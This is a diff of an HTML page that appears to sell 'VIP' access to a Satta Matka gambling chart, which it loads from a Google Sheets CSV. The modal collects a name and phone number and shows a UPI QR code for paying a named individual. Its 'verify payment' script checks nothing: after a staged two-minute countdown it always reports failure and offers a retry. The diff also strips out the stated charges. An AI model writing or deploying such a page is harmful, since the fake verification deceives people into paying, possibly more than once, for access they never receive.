@@ -22,7 +22,7 @@
         
         .scroll-btn { background: #65bbf5; color: var(--dark-blue); padding: 10px 15px; border: 3px solid #fff; border-radius: 12px; cursor: pointer; margin: 5px; font-size: 13px; font-weight: 700; display: inline-block; }
 
-        #chartArea { background: #fff; width: 95%; margin: 10px auto; border: 1px solid var(--grid-border); overflow-x: hidden; }
+        #chartArea { background: #fff; width: 95%; margin: 10px auto; border: 1px solid var(--grid-border); min-height: 200px; }
         .chart-grid { display: grid; grid-template-columns: 45px repeat(6, 1fr); width: 100%; background: #fff; }
         .day-label, .date-label { background: #000; color: var(--yellow-accent); font-weight: bold; font-size: 9px; padding: 8px 0; border: 0.5px solid var(--grid-border); }
         .date-box { background: #f2f2f2; font-size: 9px; border: 0.5px solid var(--grid-border); display: flex; align-items: center; justify-content: center; font-weight: bold; height: 60px; color: #000; }
@@ -65,11 +65,13 @@
 <button class="scroll-btn" onclick="document.getElementById('unlockArea').scrollIntoView({behavior: 'smooth'});">Go to Bottom</button>
 
 <div id="chartArea">
-    <div class="chart-grid">
+    <div class="chart-grid" id="mainGrid">
         <div class="date-label">DATE</div>
         <div class="day-label">MON</div><div class="day-label">TUE</div><div class="day-label">WED</div>
         <div class="day-label">THU</div><div class="day-label">FRI</div><div class="day-label">SAT</div>
-        <div id="gridData" style="display: contents;"></div>
+        <div id="gridData" style="display: contents;">
+            <div style="grid-column: span 7; padding: 20px;">Loading Chart...</div>
+        </div>
     </div>
 </div>
 
@@ -83,7 +85,6 @@
 
 <div id="vipModal" class="overlay">
     <div class="modal-content">
-        
         <div id="stepInfo">
             <h2 style="color:var(--dark-blue); margin-top:0;">User Detail</h2>
             <p style="font-size:14px;">आगे बढ़ने के लिए जानकारी भरें</p>
@@ -97,11 +98,11 @@
             <h2 style="color:var(--dark-blue); margin-top:0;">Select Plan</h2>
             <div class="plan-item" onclick="showPayment(1299, '7 Days')">
                 <h4>7 Days VIP - ₹1299</h4>
-                <p>7 दिन के लिए VIP चार्ट एक्सेस।<br>Charge for 7 days is ₹1299.</p>
+                <p>7 दिन के लिए VIP चार्ट एक्सेस।</p>
             </div>
             <div class="plan-item" onclick="showPayment(1799, '30 Days')">
                 <h4>30 Days VIP - ₹1799</h4>
-                <p>30 दिन के लिए VIP चार्ट एक्सेस।<br>Charge for 30 days is ₹1799.</p>
+                <p>30 दिन के लिए VIP चार्ट एक्सेस।</p>
             </div>
             <button onclick="resetSteps()" style="margin-top:15px; border:none; background:none; color:gray; cursor:pointer;">Back</button>
         </div>
@@ -110,12 +111,10 @@
             <h3 id="payTitle" style="margin:5px 0;"></h3>
             <p style="margin:2px; font-size:13px;"><strong>Pay to: Omkar Yadav</strong></p>
             <img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=upi://pay?pa=8103982813@ptsbi%26pn=Omkar%20Yadav%26cu=INR" class="qr-img">
-            
             <div id="timerBox">
                 <p style="margin:0; font-size:12px; color:red;">Verifying Payment... Please Wait</p>
                 <div id="timerText">02:00</div>
             </div>
-
             <input type="number" id="utrInput" placeholder="Enter 12 Digit UTR No.">
             <button class="verify-btn" id="verifyBtn" onclick="handleVerify()">VERIFY PAYMENT</button>
         </div>
@@ -123,12 +122,127 @@
         <div id="stepFailed" style="display:none;">
             <h2 style="font-size:40px; color:red; margin:10px 0;">⚠️</h2>
             <h3 style="color:red; margin:5px 0;">Verification Failed!</h3>
-            <p style="font-size:13px;">UTR नंबर गलत है। कृपया सही नंबर के साथ दोबारा कोशिश करें।</p>
+            <p style="font-size:13px;">UTR नंबर गलत है। कृपया दोबारा कोशिश करें।</p>
             <button class="verify-btn" onclick="resetSteps()" style="background:#4fb5f5;">TRY AGAIN</button>
         </div>
-
     </div>
 </div>
 
 <script>
-    let timeLeft = 1
+    let timeLeft = 120;
+    let timerId = null;
+
+    function openVipModal() { document.getElementById('vipModal').style.display = 'flex'; resetSteps(); }
+    function closeVipModal() { document.getElementById('vipModal').style.display = 'none'; clearInterval(timerId); }
+
+    function resetSteps() {
+        document.getElementById('stepInfo').style.display = 'block';
+        document.getElementById('stepPlans').style.display = 'none';
+        document.getElementById('stepPay').style.display = 'none';
+        document.getElementById('stepFailed').style.display = 'none';
+        document.getElementById('timerBox').style.display = 'none';
+        document.getElementById('verifyBtn').disabled = false;
+        document.getElementById('verifyBtn').innerText = "VERIFY PAYMENT";
+        document.getElementById('utrInput').value = "";
+        clearInterval(timerId);
+    }
+
+    function goToPlans() {
+        let n = document.getElementById('userName').value;
+        let p = document.getElementById('userPhone').value;
+        if(!n || p.length < 10) { alert("कृपया सही जानकारी भरें।"); return; }
+        document.getElementById('stepInfo').style.display = 'none';
+        document.getElementById('stepPlans').style.display = 'block';
+    }
+
+    function showPayment(amt, plan) {
+        document.getElementById('stepPlans').style.display = 'none';
+        document.getElementById('stepPay').style.display = 'block';
+        document.getElementById('payTitle').innerText = plan + " Plan";
+    }
+
+    function handleVerify() {
+        let utr = document.getElementById('utrInput').value;
+        if(utr.length < 10) { alert("UTR नंबर सही नहीं है।"); return; }
+        document.getElementById('verifyBtn').disabled = true;
+        document.getElementById('verifyBtn').innerText = "Checking...";
+        document.getElementById('timerBox').style.display = 'block';
+        startTimer();
+    }
+
+    function startTimer() {
+        timeLeft = 120;
+        clearInterval(timerId);
+        timerId = setInterval(() => {
+            timeLeft--;
+            let m = Math.floor(timeLeft / 60);
+            let s = timeLeft % 60;
+            document.getElementById('timerText').innerText = `${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
+            if (timeLeft <= 0) { clearInterval(timerId); showFailed(); }
+        }, 1000);
+    }
+
+    function showFailed() {
+        document.getElementById('stepPay').style.display = 'none';
+        document.getElementById('stepFailed').style.display = 'block';
+    }
+
+    // --- CHART LOADING LOGIC ---
+    const CSV_URL = "https://docs.google.com/spreadsheets/d/1IReRyQjRvWWVjZTym_8DDXvx9Jttjfgy18McY53gM5w/export?format=csv";
+
+    async function loadChart() {
+        const gridData = document.getElementById('gridData');
+        try {
+            const response = await fetch(CSV_URL + "&cache=" + new Date().getTime());
+            if (!response.ok) throw new Error("Network issue");
+            const csvText = await response.text();
+            const rows = csvText.split('\n').map(r => r.split(','));
+            
+            let html = '';
+            let lockPlaced = false;
+
+            for(let i = 1; i < rows.length; i++) {
+                let dateStr = (rows[i][0] || "").trim().replace(/"/g, "");
+                if (!dateStr) continue;
+
+                html += `<div class="date-box">${dateStr}</div>`;
+
+                for(let j = 1; j <= 16; j += 3) {
+                    let leftPanna = (rows[i][j] || "").trim().replace(/"/g, "");
+                    let jodi = (rows[i][j+1] || "").trim().replace(/"/g, "");
+                    let rightPanna = (rows[i][j+2] || "").trim().replace(/"/g, "");
+
+                    if (!leftPanna && !jodi && !rightPanna) {
+                        if (!lockPlaced) {
+                            html += `<div class="cell"><div class="single-vip-lock">🔒</div></div>`;
+                            lockPlaced = true;
+                        } else {
+                            html += `<div class="cell"></div>`;
+                        }
+                    } else {
+                        // Lal Ghar Logic
+                        let isRed = (jodi.length >= 2 && (jodi[0] === jodi[1] || Math.abs(parseInt(jodi[0]) - parseInt(jodi[1])) === 5)) || jodi.includes('*');
+                        
+                        let leftDisplay = leftPanna.split('').map(s => `<span>${s}</span>`).join('');
+                        let rightDisplay = rightPanna.split('').map(s => `<span>${s}</span>`).join('');
+
+                        html += `
+                            <div class="cell ${isRed ? 'red-house' : ''}">
+                                <div class="panna left">${leftDisplay}</div>
+                                <div class="jodi">${jodi}</div>
+                                <div class="panna right">${rightDisplay}</div>
+                            </div>`;
+                    }
+                }
+            }
+            gridData.innerHTML = html;
+        } catch (error) {
+            console.error(error);
+            gridData.innerHTML = `<div style="grid-column: span 7; padding: 20px; color: red;">डेटा लोड करने में समस्या आई। कृपया पेज रिफ्रेश करें।</div>`;
+        }
+    }
+
+    window.onload = loadChart;
+</script>
+</body>
+</html>
